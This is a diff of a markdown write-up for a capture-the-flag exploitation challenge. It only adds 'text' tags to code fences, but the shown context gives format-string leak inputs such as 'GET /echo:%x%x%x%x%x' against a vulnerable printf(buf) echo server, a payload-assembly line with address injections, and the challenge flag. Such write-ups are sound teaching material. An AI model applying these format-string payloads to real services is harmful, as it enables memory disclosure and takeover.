@@ -26,7 +26,7 @@ it calls exit to terminate the program. Otherwise the program will go on.
 The variable `buf` sucks in the whole line of input then splits the input
 into tokens according to space and colon. A diagram is showed below:
 
-```
+```text
 ORIGINAL INPUT:
 
 GET /echo:%x%x%x%x%x
@@ -61,13 +61,13 @@ According to the example string which is entered into the program, the value in
 the global variable `buf` before calling `printf(buf)` in function
 `echo()` is:
 
-```
+```text
 _x_x_x_x_x\nx%x%x%x%x\n
 ```
 
 The result showed up is:
 
-```
+```text
 _x_x_x_x_x
 xfffe4f4cbf7f4b3d00
 ```
@@ -81,7 +81,7 @@ Padding some trival characters between ':' and the format string to ensure to
 connect the global variable `buf` again, if the lenth of the string is less
 than 10.
 
-```
+```text
 GET /echo:aaaaaaa%p
 ```
 
@@ -89,7 +89,7 @@ For the string which is longer than 10, one must pad some trival characters to
 make sure the format string won't be covered by something useless by the
 fxxking program logic.
 
-```
+```text
 GGET /echo:%p%p%p%p%p
 ```
 
@@ -189,6 +189,6 @@ payload = padding + 'GET /echo:' + addr1 + inject1 + addr2 + inject2 + '\n'
 
 The flag is:
 
-```
+```text
 SECPROG{But_PWN_!s_e@sier_th@n_WEB_XDDDD}
 ```
